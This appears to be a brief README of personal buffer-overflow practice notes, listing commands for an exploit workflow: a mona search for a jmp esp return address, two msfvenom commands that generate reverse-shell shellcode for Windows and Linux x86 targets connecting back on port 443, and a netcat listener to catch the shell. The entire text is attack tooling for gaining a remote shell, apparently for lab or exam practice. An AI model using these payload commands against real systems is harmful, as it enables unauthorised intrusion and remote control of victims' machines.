# BOF_2022_02_12
Buffer Overflow Practice

# COMMANDES UTILS

1-!mona jmp -r esp -cpb  "\x00"

[+]- esp return address 311712f3

# Win x86
2- msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=443 -b '\x00' EXITFUNC=thread -f python -v shellcode

# linux target x86
3- msfvenom -p linux/x86/shell_reverse_tcp LHOST=eth0 LPORT=443 -b '\x00' EXITFUNC=thread -f python -v shellcode

# run
4- nc lnvp 443
